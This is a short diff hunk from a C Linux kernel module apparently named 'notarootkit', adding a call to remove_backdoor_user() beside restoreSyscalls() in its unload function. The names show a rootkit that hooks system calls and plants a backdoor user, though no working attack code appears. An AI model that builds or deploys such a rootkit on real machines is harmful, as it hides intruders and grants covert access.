@@ -472,6 +472,7 @@ void __exit unloadMod(void)
     pr_info("notarootkit unloading\n");
 	
     restoreSyscalls();
+    remove_backdoor_user();
 
     pr_info("notarootkit unloaded\n");
     return;
